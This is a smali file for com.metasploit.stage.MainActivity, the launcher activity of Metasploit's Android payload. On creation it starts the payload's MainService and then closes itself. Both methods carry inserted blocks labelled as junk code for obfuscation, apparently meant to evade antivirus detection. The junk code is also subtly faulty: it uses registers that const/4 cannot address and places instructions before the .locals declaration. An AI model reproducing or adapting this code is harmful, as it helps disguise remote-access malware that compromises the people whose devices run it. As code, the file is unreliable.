.class public Lcom/metasploit/stage/MainActivity;
.super Landroid/app/Activity;


# direct methods
.method public constructor <init>()V

    # Junk code for obfuscation
    const/4 v250, 0x0
    const/4 v251, 0x1
    add-int v252, v250, v251
    .locals 0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V

    # Junk code for obfuscation
    const/4 v250, 0x0
    const/4 v251, 0x1
    add-int v252, v250, v251
    .locals 0

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-static {p0}, Lcom/metasploit/stage/MainService;->startService(Landroid/content/Context;)V

    invoke-virtual {p0}, Lcom/metasploit/stage/MainActivity;->finish()V

    return-void
.end method
